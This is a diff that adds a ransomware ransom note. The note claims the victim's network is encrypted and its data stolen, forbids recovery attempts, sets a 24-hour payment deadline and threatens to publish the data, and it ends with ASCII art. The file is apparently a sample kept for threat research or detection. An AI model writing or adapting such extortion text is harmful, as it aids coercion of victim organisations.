@@ -1,0 +1,37 @@
+Hello,
+
+If you're reading this, your company's network is encrypted and most backups are destroyed. We have also exfiltrated a significant amount of your internal data.
+
+ATTENTION! Strictly prohibited:
+- Deleting or renaming encrypted files;
+- Attempting recovery with third-party tools;
+- Modifying file extensions.
+Any such actions may make recovery impossible.
+
+What you need to know:
+1. Contact us at [redacted] within 24 hours.
+2. Payment after 24 hours will be increased.
+3. We offer you a test decryption and proof of data exfiltration.
+4. If no agreement is reached, your data will be sold and published.
+
+We're open to communication, but there will be no negotiations after deadline.
+
+Your only chance to get your data back and avoid data leak is to follow our instructions exactly.
+
+ ||
+ ||
+ _;|
+ /__3
+ / /||
+ / / // .--.
+ \ \// / (OO)
+ \// |( _ )
+ // \__/`-\`__
+ // \__ _ \
+ _.-'/ | ._._.|\ \
+(_.-' | \ \ \
+ .-._ / o ) / /
+ /_ \ \ / \__/ / /
+ \ \_/ / / E_/
+ \ / /
+ `-._/-' 
